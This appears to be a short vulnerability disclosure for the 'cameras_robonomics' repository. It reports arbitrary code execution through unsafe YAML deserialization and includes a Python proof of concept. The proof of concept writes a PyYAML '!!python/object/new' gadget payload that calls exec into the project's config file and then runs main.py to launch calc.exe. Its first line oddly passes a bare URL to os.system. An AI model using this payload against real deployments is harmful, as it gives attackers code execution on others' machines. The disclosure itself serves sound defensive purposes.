# Description

`cameras_robonomics` is a repo Using Robonomics tools to control IP cameras. The Package is vulnerable to `Arbitrary Code Execution` due to insecure yaml desearilization.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

_steps to reproduce:_
```python
import os

os.system('https://github.com/PaTara43/cameras_robonomics')
os.chdir('cameras_robonomics/')

payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('calc.exe')"
"""

open('config/config.yaml','w+').write(payload)
os.system('python3 main.py')
```
* `python3 exploit.py`

# Impact

Arbitrary Code Execution
